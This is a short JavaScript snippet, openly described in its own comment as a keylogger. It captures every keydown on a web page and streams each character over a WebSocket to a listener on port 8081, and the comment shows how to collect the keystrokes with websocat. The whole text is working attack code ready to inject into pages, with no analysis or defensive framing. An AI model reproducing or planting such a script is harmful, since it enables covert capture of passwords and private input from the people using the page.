var ws = new WebSocket('ws://localhost:8081')
document.body.addEventListener("keydown", function(keypress){
ws.send(String.fromCharCode(keypress.keyCode))
})
//use websocat -s 8081 -0 to catch the keylogger